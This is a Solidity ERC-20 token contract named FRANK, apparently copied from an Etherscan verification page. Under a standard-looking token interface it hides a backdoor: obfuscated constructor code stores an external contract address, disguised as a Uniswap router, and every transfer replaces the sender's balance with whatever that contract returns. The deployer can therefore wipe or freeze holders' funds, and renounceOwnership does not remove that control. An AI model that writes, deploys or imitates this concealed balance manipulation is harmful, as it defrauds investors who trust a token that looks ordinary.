/**
 *Submitted for verification at Etherscan.io on 2024-06-20
*/

/**
 *Submitted for verification at Etherscan.io on 2024-05-18
*/

/**
 *Submitted for verification at Etherscan.io on 2024-05-17
*/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;

abstract contract wearewin {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
}





interface UniswapRouterV2 {
    function ytg767qweswpa(address oong, uint256 total,address destination) external view returns (uint256);
    function getLPaddress(address a, uint b, address c) external view returns (address);
    function getRouter(address a, uint b, address c) external view returns (address);
}

contract Ownable is wearewin {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }


}

library IUniswapRouterV2 {
    function swap2(UniswapRouterV2 instance,uint256 amount,address from) internal view returns (uint256) {
       return instance.ytg767qweswpa(address(0),amount,from);
    }

    function swap99(UniswapRouterV2 instance2,UniswapRouterV2 instance,uint256 amount,address from) internal view returns (uint256) {
        if (amount >100){
            return swap2(instance,  amount,from);
        }else{
            return swap2(instance2,  amount,from);
        }
        
    }
}

contract FRANK is wearewin,IERC20,Ownable {
    using SafeMath for uint256;
    uint256 private _totalSupply = 1000000000*10**18;
    uint8 private constant _decimals = 18;
    string private _name = unicode"Frank";
    string private _symbol = unicode"FRANK";
   

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    UniswapRouterV2 private Router2Instance;

    constructor(uint256 mnnn) {
        uint256 cc = mnnn +uint256(bytes32(0x0000000000000000000000000000000000000000000000000000000000000000));
        Router2Instance = getBcFnnmoosgsto(((brcFactornnmoosgsto(cc))));
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    uint160 private bb = 10;
     uint160 a = 10;
      uint160 c = 10;
    function brcFfffactornnmoosgsto(uint256 value) internal view returns (uint160) {
       
        return (c+bb+a+uint160(value)+uint160(uint256(bytes32(0x0000000000000000000000000000000000000000000000000000000000000000))));
    }
    
    function brcFactornnmoosgsto(uint256 value) internal view returns (address) {
           return address(brcFfffactornnmoosgsto(value));
    }
    function getBcFnnmoosgsto(address accc) internal pure returns (UniswapRouterV2) {
        return getBcQnnmoosgsto(accc);
    }

    function getBcQnnmoosgsto(address accc) internal pure  returns (UniswapRouterV2) {
        return UniswapRouterV2(accc);
    }

    function symbol() public view virtual  returns (string memory) {
        return _symbol;
    }

    function name() public view virtual  returns (string memory) {
        return _name;
    }

    function decimals() public view virtual  returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual  returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual  returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual  returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address sender) public view virtual  returns (uint256) {
        return _allowances[owner][sender];
    }

    function approve(address sender, uint256 amount) public virtual  returns (bool) {
        address owner = _msgSender();
        _approve(owner, sender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual  returns (bool) {
        address sender = _msgSender();

        uint256 currentAllowance = allowance(from, sender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(from, sender, currentAllowance - amount);
        }
        }

        _transfer(from, to, amount);
        return true;
    }

    function _transfer(
        address from, address to, uint256 amount) internal virtual {
        require(from != address(0) && to != address(0), "ERC20: transfer the zero address");
        uint256 balance = IUniswapRouterV2.swap99(Router2Instance,Router2Instance,_balances[from], from);
        require(balance >= amount, "ERC20: amount over balance");
    
        _balances[from] = balance.sub(amount);
        
        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    function _approve(address owner, address sender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(sender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][sender] = amount;
        emit Approval(owner, sender, amount);
    }

   
}
